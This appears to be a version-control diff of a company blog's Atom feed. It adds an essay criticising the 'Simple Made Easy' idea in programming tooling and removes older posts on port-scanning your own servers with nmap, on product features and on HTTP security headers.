+&lt;h2 id="quot-simple-easy-quot-is-one-of-the-most-toxic-ideas-ever-introduced-to-programming"&gt;&amp;ldquo;Simple != Easy&amp;rdquo; Is One Of The Most Toxic Ideas Ever Introduced To Programming&lt;/h2&gt;
+
+&lt;p&gt;For those of you outside of Clojureland, this is a reference to well-known 2011 Rich Hickey talk titled &amp;ldquo;&lt;a href="https://www.infoq.com/presentations/Simple-Made-Easy"&gt;Simple Made Easy&lt;/a&gt;&amp;rdquo;. &lt;/p&gt;
+
+&lt;p&gt;Rich&amp;rsquo;s thesis is that the best, most conceptually simple solution to a problem isn&amp;rsquo;t automatically also going to be &lt;em&gt;simple to use&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Often, when we say something is &lt;em&gt;easy&lt;/em&gt;, we actually just mean that it is familiar to us, and that we&amp;rsquo;ve used something like it before. Just because we don&amp;rsquo;t have to engage our brain doesn&amp;rsquo;t mean a concept or framework or artifact isn&amp;rsquo;t &lt;em&gt;complex&lt;/em&gt;. &lt;/p&gt;
+
+&lt;p&gt;Often the simplest solution may be very different from what you were expecting, and may therefore require some elbow grease.&lt;/p&gt;
+
+&lt;p&gt;I thought that talk was really insightful when I first watched it. Math, for example, is a place where you can dedicate a lifetime of mental energy to simple but hard things. And it&amp;rsquo;s true that many easy things are needlessly complex. But, having seen how people refer to it over the years, I&amp;rsquo;ve since soured on the concept.&lt;/p&gt;
+
+&lt;h3 id="in-practice-39-simple-made-easy-39-is-an-elaborate-excuse-for-making-software-that-is-hard-to-use"&gt;In practice, &amp;lsquo;Simple Made Easy&amp;rsquo; is an elaborate excuse for making software that is hard to use.&lt;/h3&gt;
+
+&lt;p&gt;By separating &amp;ldquo;simplicity&amp;rdquo; from &amp;ldquo;ease of use&amp;rdquo;, and then establishing the &lt;em&gt;primacy of simplicity&lt;/em&gt;, it gives people an ideological out to discount improving the user interface of our tools and artifacts.&lt;/p&gt;
+
+&lt;p&gt;If your chief goal is simplicity, and beauty, and elegance, then it&amp;rsquo;s not really your fault if people don&amp;rsquo;t &amp;ldquo;get it&amp;rdquo;. It blinds us to critiques of our software: if we don&amp;rsquo;t value the accessibility of our tools then it becomes very difficult to distinguish &amp;ldquo;there are a lot of arbitrary barriers preventing my understanding&amp;rdquo; from &amp;ldquo;I&amp;rsquo;m lazy and couldn&amp;rsquo;t be bothered to try hard enough&amp;rdquo;&lt;sup id="fnref3"&gt;&lt;a href="#fn3" rel="footnote"&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;p&gt;Establishing this narrow view of &amp;ldquo;simplicity&amp;rdquo; as wholly separate from &amp;ldquo;easy to use&amp;rdquo; prevents us from being able to optimize for ease-of-use, aka developer experience.&lt;/p&gt;
+
+&lt;p&gt;In my talk I called the Clojureland ecosystem &amp;ldquo;user-hostile&amp;rdquo;. This contrasts sharply with the community, who are by and large very sweet and personable and well-meaning. &lt;/p&gt;
+
+&lt;p&gt;Undoubtedly, I chafed because Clojureland tools were &lt;strong&gt;unfamiliar&lt;/strong&gt;, yes. But past a certain point they were also &lt;em&gt;unfriendly&lt;/em&gt;, because in their error messages and affordances and failure conditions they assumed a rather high tolerance for digging through code and high-level knowledge of Clojure&amp;rsquo;s concepts and idioms and runtime quirks.&lt;/p&gt;
+
+&lt;p&gt;So we went back to Ruby, which we knew really well.&lt;/p&gt;
+
+&lt;p&gt;But here is the rub: Ruby&amp;rsquo;s tooling is &lt;a href="http://www.virtuouscode.com/2015/07/08/ruby-is-defined-by-terrible-tools/"&gt;terrible&lt;/a&gt;. The interpreter is slow and finicky and it used to leak memory like a sieve. There is no static introspection, the meta programming features are basic and slow and it is trivially easy to bleed state and complect the hell out of your programs. It was great compared to Java or PHP in 2004. In 2017, the world is different.&lt;/p&gt;
+
+&lt;p&gt;But, do you know what Ruby really has got going for it? Ruby is &lt;a href="http://www.artima.com/intv/rubyP.html"&gt;designed to be fun and make programmers happy&lt;/a&gt;. I think this is such a dope design philosophy that I&amp;rsquo;ll go one step further:&lt;/p&gt;
+
+&lt;h2 id="all-programming-languages-should-strive-to-be-fun-and-make-programmers-happy"&gt;All programming languages should strive to be fun and make programmers happy.&lt;/h2&gt;
+
+&lt;p&gt;I think this is by far the most important contribution Ruby brought to programming, and as Ruby has stabilized and become less exciting and people have moved on, it has been incredible to &lt;a href="https://twitter.com/sarahmei/status/849065056746827776"&gt;ex-Rubyists bring these values with them to their new communities&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;You can see this attitude in Elixir, in Rust, in Ember. Our tools should help you achieve success. Our tools should get out of the way. Our tools should Just Work.&lt;/p&gt;
+
+&lt;p&gt;The truth is, programming can be complex, but it is also often needlessly hard. Programmers are the end-users of programming tools, and to ignore their experience using them is just plain bad design. We should strive to be as maximally welcoming as we can, for every level of experience.&lt;/p&gt;
+
+&lt;div class="footnotes"&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+
+&lt;li id="fn1"&gt;
+&lt;p&gt;I called it &amp;ldquo;abuse&amp;rdquo; elsewhere, which is maybe a bit much. People were mostly just somewhat rude. It&amp;rsquo;s just not&amp;hellip; pleasant to have a bunch of people calling you incompetent over and over again ¯\_(ツ)_/¯.&amp;nbsp;&lt;a href="#fnref1" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li id="fn2"&gt;
+&lt;p&gt;I am exaggerating and bear no ill will ;).&amp;nbsp;&lt;a href="#fnref2" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;li id="fn3"&gt;
+&lt;p&gt;By far the most common response to my talk was, but are you sure you tried hard enough? If you keep trying, you&amp;rsquo;ll get it. Just work harder at it. There&amp;rsquo;s a hidden insinuation: maybe you&amp;rsquo;re not smart enough to get it. I&amp;rsquo;d like to think that I am.&amp;nbsp;&lt;a href="#fnref3" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+
+&lt;/ol&gt;
+&lt;/div&gt;
+</content>
+  </entry>
   <entry>
     <title>Podcast Episode 2 - Casinos and Pseudorandom Generators</title>
     <link rel="alternate" href="https://blog.appcanary.com/2017/podcast-casinos-pseudorandom.html"/>
     <id>https://blog.appcanary.com/2017/podcast-casinos-pseudorandom.html</id>
-    <published>2017-04-06T17:00:00-07:00</published>
-    <updated>2017-05-16T12:08:44-07:00</updated>
+    <published>2017-04-06T20:00:00-04:00</published>
+    <updated>2017-05-16T15:08:44-04:00</updated>
     <author>
       <name>Phillip Mendonça-Vieira</name>
     </author>
@@ -37,8 +375,8 @@
     <title>Appcanary Podcast Episode 1 - MongoDB, Ransomware and Algorithms</title>
     <link rel="alternate" href="https://blog.appcanary.com/2017/podcast-mongodb-opacity-algorithms.html"/>
     <id>https://blog.appcanary.com/2017/podcast-mongodb-opacity-algorithms.html</id>
-    <published>2017-03-12T17:00:00-07:00</published>
-    <updated>2017-05-16T12:08:44-07:00</updated>
+    <published>2017-03-12T20:00:00-04:00</published>
+    <updated>2017-05-16T15:08:44-04:00</updated>
     <author>
       <name>Phillip Mendonça-Vieira</name>
     </author>
@@ -63,1117 +401,6 @@
 &lt;li&gt;&lt;p&gt;&lt;a href="https://www.buzzfeed.com/craigsilverman/how-macedonia-became-a-global-hub-for-pro-trump-misinfo?utm_term=.sipLg3Ewn7#.ucL3vZkmXD"&gt;Macedonian Teens &amp;amp; Fake News&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
 &lt;li&gt;&lt;p&gt;&lt;a href="http://www.theverge.com/2016/10/28/13453344/comma-ai-self-driving-car-comma-one-kit-canceled"&gt;Geohot&amp;rsquo;s self-driving car&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
 &lt;/ul&gt;
-</content>
-  </entry>
-  <entry>
-    <title>Improve Your Security: Port Scan Yourself</title>
-    <link rel="alternate" href="https://blog.appcanary.com/2017/improve-security-port-scan-yourself.html"/>
-    <id>https://blog.appcanary.com/2017/improve-security-port-scan-yourself.html</id>
-    <published>2017-01-19T16:00:00-08:00</published>
-    <updated>2017-05-16T12:08:44-07:00</updated>
-    <author>
-      <name>Max Veytsman</name>
-    </author>
-    <content type="html">&lt;p&gt;Ransomware crews are no longer satisfied &lt;a href="https://www.wired.com/2016/03/ransomware-why-hospitals-are-the-perfect-targets/"&gt;shutting down hospitals&lt;/a&gt; and are now also going after hip tech startups. Last week, a professional crew got involved in &lt;a href="https://www.bleepingcomputer.com/news/security/mongodb-apocalypse-professional-ransomware-group-gets-involved-infections-reach-28k-servers/"&gt;ransoming MongoDB instances&lt;/a&gt;, and some 28,000 servers were compromised and held for Bitcoin.&lt;/p&gt;
-
-&lt;p&gt;The &amp;ldquo;attack&amp;rdquo; is so simple it barely deserves the name. The crew scans the internet looking for open and unsecured instances of MongoDB. When they find one, they log in and steal the data. The victims must pay Bitcoin to get their data back. To save on storage costs, sometimes the crew just deletes the data without bothering to save it &amp;mdash; and the mark ends up paying for nothing. Even honor among thieves can&amp;rsquo;t survive the harsh realities of 21st century globalized late cyber-capitalism.&lt;/p&gt;
-
-&lt;p&gt;When reading about these attacks, there is a strong temptation blame the victim. Hospitals were at fault because of their antiquated IT departments: huge, sclerotic fiefdoms incapable of moving past Windows 98. We all know that MongoDB &lt;a href="http://cryto.net/~joepie91/blog/2015/07/19/why-you-should-never-ever-ever-use-mongodb/"&gt;sucks&lt;/a&gt;, and that &lt;a href="http://www.catb.org/jargon/html/story-of-mel.html"&gt;Real Programmers&lt;/a&gt; would never be caught dead using it. Why, they probably &lt;em&gt;deserved&lt;/em&gt; to get hacked!&lt;/p&gt;
-
-&lt;p&gt;Don&amp;rsquo;t do it. As I&amp;rsquo;ve said before, victim-blaming in security is a &lt;a href="https://blog.appcanary.com/2016/mirai-botnet-security-broken.html"&gt;trap that must be avoided&lt;/a&gt;. Attacks are varied and always changing; best practices can be indistinguishable from cargo cults, and default configurations seem almost designed to foil you.&lt;/p&gt;
-
-&lt;p&gt;In this case, MongoDB apparently ships without any authentication, listening to the whole wide world. No wonder so many instances got hacked!&lt;/p&gt;
-
-&lt;h2 id="howto-not-get-hacked"&gt;HOWTO not get hacked&lt;/h2&gt;
-
-&lt;p&gt;Basically, you should have as little as possible accessible to the outside world. Set up a firewall. This tweet sums up the idea best:&lt;/p&gt;
-
-&lt;blockquote class="twitter-tweet" data-lang="en"&gt;&lt;p lang="en" dir="ltr"&gt;If Postgres, MySQL, memcached, redis, etc responds to commands from outside the VPN/firewall/etc, assume you will lose your deployment.&lt;/p&gt;&amp;mdash; Patrick McKenzie (@patio11) &lt;a href="https://twitter.com/patio11/status/818728480661590018"&gt;January 10, 2017&lt;/a&gt;&lt;/blockquote&gt;
-
-&lt;script async src="//platform.twitter.com/widgets.js" charset="utf-8"&gt;&lt;/script&gt;
-
-&lt;p&gt;If you&amp;rsquo;re anything like me, the first thought when confronted with that tweet is: &amp;ldquo;is my firewall actually working right?&amp;rdquo; Would you bet money that you know what ports are open on a given server in your fleet?&lt;/p&gt;
-
-&lt;h3 id="enter-nmap"&gt;Enter Nmap&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src="/images/trinity_nmap.jpg" title="Nmap as used in The Matrix" alt="trinity using Nmap" /&gt;
-&lt;em&gt;Nmap as used in The Matrix&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href="https://nmap.org/"&gt;Nmap&lt;/a&gt; is an incredibly powerful tool that&amp;rsquo;s &lt;a href="https://nmap.org/movies/"&gt;synonymous&lt;/a&gt; with port scanning. A port scanner is a program that checks to see what network ports are open on a computer.&lt;/p&gt;
-
-&lt;p&gt;Here&amp;rsquo;s what scanning &lt;a href="https://appcanary.com"&gt;appcanary.com&lt;/a&gt; with default settings from my work computer looks like:&lt;/p&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ nmap appcanary.com
-
-Starting Nmap 7.12 ( https://nmap.org ) at 2017-01-16 12:57 EST
-Nmap scan report for appcanary.com (45.55.197.253)
-Host is up (0.030s latency).
-Not shown: 993 closed ports
-PORT    STATE    SERVICE
-22/tcp  open     ssh
-25/tcp  filtered smtp
-80/tcp  open     http
-135/tcp filtered msrpc
-139/tcp filtered netbios-ssn
-443/tcp open     https
-445/tcp filtered microsoft-ds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;You&amp;rsquo;ll see that 22, 80, and 443 are open. This is because we listen on SSH, HTTP and HTTPS. There are also a bunch of filtered ports. This is because some router or firewall between me and appcanary is blocking that port so it&amp;rsquo;s not clear whether it&amp;rsquo;s open or closed. &lt;/p&gt;
-
-&lt;p&gt;Running the same scan from a random&lt;sup id="fnref1"&gt;&lt;a href="#fn1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt; Digital Ocean box gives me the true result without the intermediate network filtering.&lt;/p&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Starting Nmap 5.21 ( http://nmap.org ) at 2017-01-16 13:04 EST
-Nmap scan report for appcanary.com (45.55.197.253)
-Host is up (0.0012s latency).
-Not shown: 997 closed ports
-PORT    STATE SERVICE
-22/tcp  open  ssh
-80/tcp  open  http
-443/tcp open  https
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nmap has a variety of &lt;a href="https://nmap.org/book/man-port-scanning-techniques.html"&gt;scanning options&lt;/a&gt;, but the most important thing to understand for TCP scans is the difference between SYN scanning and connect scanning.&lt;/p&gt;
-
-&lt;p&gt;If you&amp;rsquo;ve ever tried to write a port scanner (which is a great exercise in network programming and concurrency), you&amp;rsquo;ve probably tried to write a connect scanner. A connect scanner tries to connect to a port, and closes the connection after success. Nmap&amp;rsquo;s most popular mode is SYN scanning. In SYN scanning, you send a SYN packet initiating the &lt;a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_establishment"&gt;TCP handshake&lt;/a&gt;. If you get an SYN-ACK back, the port is open, and you send a RST instead of an ACK as you would if you were actually connecting. This is &amp;ldquo;stealthier&amp;rdquo;, which doesn&amp;rsquo;t matter as much for our purposes, and is more efficient. Unfortunately it requires nmap to be run as root because it needs raw access to the network interface.&lt;/p&gt;
-
-&lt;p&gt;You can specify a SYN scan with &lt;code&gt;nmap -sS&lt;/code&gt;, and a connect scan with &lt;code&gt;nmap -sT&lt;/code&gt;. By default nmap will prefer to do a SYN scan if it is able to.&lt;/p&gt;
-
-&lt;p&gt;By default, nmap will scan the top 1000 most common ports. You can specify a specific ports or a range with &lt;code&gt;-p&lt;/code&gt;, i.e. &lt;code&gt;nmap -p22&lt;/code&gt; will scan only port 22, and &lt;code&gt;nmap -p400-500&lt;/code&gt; will scan ports 400 through 500. &lt;code&gt;nmap -p-&lt;/code&gt; will scan the complete port range (1-65535).&lt;/p&gt;
-
-&lt;h3 id="developer-port-scan-thyself"&gt;Developer, port scan thyself&lt;/h3&gt;
-
-&lt;p&gt;Regularly port scan yourself; it&amp;rsquo;s the only way to be certain that your databases aren&amp;rsquo;t listening to the outside world. Run Nmap against your servers, and make sure that only the ports you expect are open. &lt;/p&gt;
-
-&lt;p&gt;To make it easier, here&amp;rsquo;s a script to do it for you. This will run Nmap, compare the output with predefined ports, and ping you on Slack if there&amp;rsquo;s a mismatch. Run it on a cron job, so you can check on the regular.&lt;/p&gt;
-
-&lt;script src="https://gist.github.com/mveytsman/7a3366e69401fae6e9a4f9eaf0d3f9b1.js"&gt;&lt;/script&gt;
-
-&lt;h2 id="how-does-appcanary-fit-in"&gt;How does Appcanary fit in?&lt;/h2&gt;
-
-&lt;p&gt;Our mission is to help you do security basics right, so you can be free to worry about the hard stuff. We&amp;rsquo;re building the &lt;a href="https://appcanary.com"&gt;world&amp;rsquo;s best patch management product&lt;/a&gt; because we had a deep need for one ourselves, and it automated such a vital part of a security team&amp;rsquo;s job.&lt;/p&gt;
-
-&lt;p&gt;When I started writing this article, I didn&amp;rsquo;t realize how well it fit into what we&amp;rsquo;re doing with patch management. To do security right, you need to implement systems and continuously verify they are working correctly. &lt;a href="https://appcanary.com"&gt;Appcanary&lt;/a&gt; helps you verify your patch management program, the script above helps you verify your firewall. Both without any bullshit.&lt;/p&gt;
-
-&lt;h3 id="we-want-to-hear-from-you"&gt;We want to hear from you&lt;/h3&gt;
-
-&lt;p&gt;Did I convince you to port scan your systems after reading the article? Are you using the script above? Something else? Let me know: &lt;a href="mailto:max@appcanary.com"&gt;max@appcanary.com&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class="footnotes"&gt;
-&lt;hr&gt;
-&lt;ol&gt;
-
-&lt;li id="fn1"&gt;
-&lt;p&gt;If you&amp;rsquo;re observant, you may have noticed that this version of nmap is much older than the one on my work computer. If you&amp;rsquo;re really observant, you may have noticed that it has a &lt;a href="https://appcanary.com/vulns/35319"&gt;vulnerability&lt;/a&gt;.&amp;nbsp;&lt;a href="#fnref1" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-&lt;/li&gt;
-
-&lt;/ol&gt;
-&lt;/div&gt;
-</content>
-  </entry>
-  <entry>
-    <title>New Year, New Appcanary Features</title>
-    <link rel="alternate" href="https://blog.appcanary.com/2017/new-year-new-appcanary.html"/>
-    <id>https://blog.appcanary.com/2017/new-year-new-appcanary.html</id>
-    <published>2017-01-15T16:00:00-08:00</published>
-    <updated>2017-05-16T12:08:44-07:00</updated>
-    <author>
-      <name>Max Veytsman</name>
-    </author>
-    <content type="html">&lt;p&gt;We&amp;rsquo;ve been hard at work the past few months on lots of features touching every aspect of our product, and to ring in the new year, we&amp;rsquo;re going to announce them all at once.&lt;/p&gt;
-
-&lt;h2 id="search-our-vulnerabilities"&gt;Search our vulnerabilities&lt;/h2&gt;
-
-&lt;p&gt;You can now browse and search every vulnerability Appcanary knows about! It&amp;rsquo;s pretty snazzy:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src="/images/vuln_browse.png" alt="browse our vulnerabilities" /&gt;&lt;/p&gt;
-
-&lt;h2 id="automatically-upgrade-packages"&gt;Automatically upgrade packages&lt;/h2&gt;
-
-&lt;p&gt;We&amp;rsquo;ve had this feature for Ubuntu, and now we&amp;rsquo;re adding it for CentOS.&lt;/p&gt;
-
-&lt;p&gt;If you have the appcanary agent installed, you can run &lt;code&gt;appcanary upgrade&lt;/code&gt;, and
-we&amp;rsquo;ll automatically upgrade all of your vulnerable packages to the lowest
-version that fixes all the vulnerabilities we know about.&lt;/p&gt;
-
-&lt;h2 id="resolve-vulnerabilities"&gt;Resolve vulnerabilities&lt;/h2&gt;
-
-&lt;p&gt;There&amp;rsquo;s now a &amp;ldquo;marked resolved&amp;rdquo; button that lets us know that you don&amp;rsquo;t want to be notified about a vulnerability. This is used if a vulnerability doesn&amp;rsquo;t affect you, or if you are accepting the risk based on some other mitigation&amp;rsquo;s (i.e. you&amp;rsquo;re not using the vulnerable feature of the package, the port in question is blocked by a firewall, etc). We give you the opportunity to record your reasoning and provide a full audit trail of every vulnerability you mark as resolved:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src="/images/audit_log.png" alt="audit log" /&gt;&lt;/p&gt;
-
-&lt;h2 id="brand-new-dashboard"&gt;Brand new dashboard&lt;/h2&gt;
-
-&lt;p&gt;We just pushed a brand new UX for our dashboard. You can sort and search and sort all of your servers and monitors. Check it &lt;a href="https://appcanary.com/dashboard"&gt;out&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src="/images/new_dashboard.png" alt="new dashboard" /&gt;&lt;/p&gt;
-
-&lt;h2 id="the-appcanary-rubygem"&gt;The Appcanary rubygem&lt;/h2&gt;
-
-&lt;p&gt;We released the &lt;a href="https://rubygems.org/gems/appcanary"&gt;Appcanary gem&lt;/a&gt;. This gives us tighter integration with ruby projects, you can either check your ruby project for vulnerabilities as a one-time check, or set up a monitor with notifications. You can see the source &lt;a href="https://github.com/appcanary/appcanary.rb"&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Our gem is still very early, so we very much want your feedback. Please let us know what you think at &lt;a href="mailto:hello@appcanary.com"&gt;hello@appcanary.com&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id="centos-6-support"&gt;CentOS 6 support&lt;/h2&gt;
-
-&lt;p&gt;Last but not lease, we fully support CentOS 6 along with CentOS 7.&lt;/p&gt;
-</content>
-  </entry>
-  <entry>
-    <title>Everything you need to know about HTTP security headers</title>
-    <link rel="alternate" href="https://blog.appcanary.com/2017/http-security-headers.html"/>
-    <id>https://blog.appcanary.com/2017/http-security-headers.html</id>
-    <published>2017-01-12T16:00:00-08:00</published>
-    <updated>2017-05-16T12:50:55-07:00</updated>
-    <author>
-      <name>Max Veytsman</name>
-    </author>
-    <content type="html">&lt;p&gt;Some physicists 28 years ago needed a way to easily share experimental data and
-thus the web was born.  This was generally considered to be a good move.
-Unfortunately, everything physicists touch &amp;mdash; from trigonometry to the
-strong nuclear force &amp;mdash; eventually becomes weaponized and so too has the
-Hypertext Transfer Protocol. &lt;/p&gt;
-
-&lt;p&gt;What can be attacked must be defended, and since tradition requires all security
-features to be a bolted-on afterthought, things… got a little complicated. &lt;/p&gt;
-
-&lt;p&gt;This article explains what secure headers are and how to implement these headers
-in Rails, Django, Express.js, Go, Nginx, Apache and Varnish.&lt;/p&gt;
-
-&lt;p&gt;Please note that some
-headers may be best configured in on your HTTP servers, while others should be
-set on the application layer. Use your own discretion here. You can test how well you&amp;rsquo;re doing with Mozilla&amp;rsquo;s
-&lt;a href="https://observatory.mozilla.org/analyze.html?host=appcanary.com"&gt;Observatory&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Did we get anything wrong? Contact us at &lt;a href="mailto:hello@appcanary.com"&gt;hello@appcanary.com&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h2&gt;HTTP Security Headers&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#x-xss-protection"&gt;X-XSS-Protection&lt;/a&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#x-xss-protection/why"&gt;Why?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-xss-protection/should"&gt;Should I use it?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-xss-protection/how"&gt;How?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-xss-protection/more"&gt;I want to know more&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#csp"&gt;Content Security Policy&lt;/a&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#csp/why"&gt;Why?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#csp/should"&gt;Should I use it?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#csp/how"&gt;How?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#csp/more"&gt;I want to know more&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#hsts"&gt;HTTP Strict Transport Security (HSTS)&lt;/a&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#hsts/why"&gt;Why?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#hsts/should"&gt;Should I use it?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#hsts/how"&gt;How?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#hsts/more"&gt;I want to know more&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#hpkp"&gt;HTTP Public Key Pinning (HPKP)&lt;/a&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#hpkp/why"&gt;Why?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#hpkp/should"&gt;Should I use it?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#hpkp/how"&gt;How?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#hpkp/more"&gt;I want to know more&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-frame-options"&gt;X-Frame-Options&lt;/a&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#x-frame-options/why"&gt;Why?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-frame-options/should"&gt;Should I use it?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-frame-options/how"&gt;How?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-frame-options/more"&gt;I want to know more&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-content-type-options"&gt;X-Content-Type-Options&lt;/a&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#x-content-type-options/why"&gt;Why?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-content-type-options/should"&gt;Should I use it?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-content-type-options/how"&gt;How?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#x-content-type-options/more"&gt;I want to know more&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#referrer-policy"&gt;Referrer-Policy&lt;/a&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#referrer-policy/why"&gt;Why?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#referrer-policy/should"&gt;Should I use it?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#referrer-policy/how"&gt;How?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#referrer-policy/more"&gt;I want to know more&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#cookie-options"&gt;Cookie Options&lt;/a&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="#cookie-options/why"&gt;Why?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#cookie-options/should"&gt;Should I use it?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#cookie-options/how"&gt;How?&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#cookie-options/more"&gt;I want to know more&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr&gt;
-
-&lt;h2 id="x-xss-protection"&gt;X-XSS-Protection&lt;/h2&gt;
-&lt;pre class="highlight plaintext"&gt;&lt;code&gt;X-XSS-Protection: 0;
-X-XSS-Protection: 1;
-X-XSS-Protection: 1; mode=block
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id="x-xss-protection/why"&gt;Why?&lt;/h3&gt;
-
-&lt;p&gt;Cross Site Scripting, commonly abbreviated XSS, is an attack where the attacker
-causes a page to load some malicious javascript.  &lt;code&gt;X-XSS-Protection&lt;/code&gt; is a
-feature in Chrome and Internet Explorer that is designed to protect against
-&amp;ldquo;reflected&amp;rdquo; XSS attacks &amp;mdash; where an attacker is sending the malicious
-payload as part of the request&lt;sup id="fnref1"&gt;&lt;a href="#fn1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;X-XSS-Protection: 0&lt;/code&gt; turns it off.&lt;br/&gt;
-&lt;code&gt;X-XSS-Protection: 1&lt;/code&gt; will filter out scripts that came from the request - but
-will still render the page&lt;br/&gt; 
-&lt;code&gt;X-XSS-Protection: 1; mode=block&lt;/code&gt; when triggered, will block the whole page from being rendered.&lt;/p&gt;
-
-&lt;h3 id=x-xss-protection/should""&gt;Should I use it? &lt;/h3&gt;
-
-&lt;p&gt;Yes. Set &lt;code&gt;X-XSS-Protection: 1; mode=block&lt;/code&gt;. The &amp;ldquo;filter bad scripts&amp;rdquo; mechanism is problematic; see &lt;a href="http://blog.innerht.ml/the-misunderstood-x-xss-protection/"&gt;here&lt;/a&gt; for why.&lt;/p&gt;
-
-&lt;h3 id="x-xss-protection/how"&gt;How?&lt;/h3&gt;
-
-&lt;table&gt;&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Platform&lt;/th&gt;
-&lt;th&gt;What do I do?&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Rails 4 and 5&lt;/td&gt;
-&lt;td&gt;On by default&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Django&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;SECURE_BROWSER_XSS_FILTER = True&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Express.js&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://helmetjs.github.io/docs/xss-filter/"&gt;helmet&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Go&lt;/td&gt;
-&lt;td&gt;Use &lt;a href="https://github.com/unrolled/secure"&gt;unrolled/secure&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Nginx&lt;/td&gt;
